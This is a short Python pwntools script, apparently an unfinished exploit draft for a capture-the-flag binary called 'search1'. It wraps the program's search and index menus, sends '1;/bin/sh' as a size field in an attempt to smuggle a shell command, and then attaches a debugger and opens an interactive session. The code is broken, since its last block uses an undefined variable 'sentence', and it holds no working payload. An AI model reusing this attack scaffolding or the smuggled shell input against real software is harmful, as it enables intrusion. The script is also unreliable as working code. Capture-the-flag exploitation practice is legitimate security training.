#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./search1')
libc = ELF('libc.so.6')
# libc = elf.libc
p = process('./search1')

def search_word_ans(word,ans):
    p.recvuntil('3: Quit\n')
    p.sendline('1')
    p.recvuntil('size:\n')
    p.sendline(str(len(word)))
    p.recvuntil('word:\n')
    p.sendline(word)
    p.recvuntil('(y/n)?\n')
    p.sendline(ans)

def search_word(word):
    p.recvuntil('3: Quit\n')
    p.sendline('1')
    p.recvuntil('size:\n')
    p.sendline(str(len(word)))
    p.recvuntil('word:\n')
    p.sendline(word)

def index_sentence(sentence):
    p.recvuntil('3: Quit\n')
    p.sendline('2')
    p.recvuntil('size:\n')
    p.sendline(str(len(sentence)))
    p.recvuntil('sentence:\n')
    p.sendline(sentence)

def debug():
    gdb.attach(p)
    pause()

p.recvuntil('3: Quit\n')
p.sendline('2')
p.recvuntil('size:\n')
p.sendline('1;/bin/sh')
p.recvuntil('sentence:\n')
p.sendline(sentence)

debug()
p.interactive()